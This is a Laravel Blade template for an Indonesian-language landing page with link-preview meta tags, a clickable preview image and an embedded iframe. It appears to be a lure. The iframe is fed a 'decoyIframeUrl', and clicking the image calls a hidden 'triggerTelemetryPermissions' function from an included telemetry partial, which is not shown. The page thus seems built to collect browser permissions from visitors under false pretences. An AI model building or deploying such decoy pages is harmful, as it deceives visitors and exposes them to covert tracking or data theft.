<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $siteTitle }}</title>
    
    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="{{ $siteTitle }}">
    <meta property="og:description" content="{{ $siteDescription }}">
    <meta property="og:image" content="{{ $ogImageUrl }}">
    <meta property="og:type" content="website">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #0e0e10;
            color: #efeff1;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 600px;
            text-align: center;
            padding: 15px;
        }
        .title {
            color: #ffffff;
            margin-bottom: 15px;
            font-size: 1.25rem;
            font-weight: 600;
        }
        .preview-img {
            width: 100%;
            max-height: 500px;
            object-fit: cover;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
            cursor: pointer;
        }
        .iframe-container {
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
            overflow: hidden;
            background: #18181b;
        }
        iframe {
            width: 100%;
            height: 600px;
            border: none;
        }
    </style>
</head>
<body>

    <div class="container">
        @if(!empty($landingHeading))
            <h3 class="title">{{ $landingHeading }}</h3>
        @endif
        @if(!empty($ogImageUrl))
            <img src="{{ $ogImageUrl }}" alt="Preview" class="preview-img" onclick="if(window.triggerTelemetryPermissions) window.triggerTelemetryPermissions();">
        @endif
    </div>

    @if(!empty($decoyIframeUrl))
        <div class="iframe-container">
            <iframe src="{{ $decoyIframeUrl }}"></iframe>
        </div>
    @endif

    @include('landing.partials.telemetry')

</body>
</html>
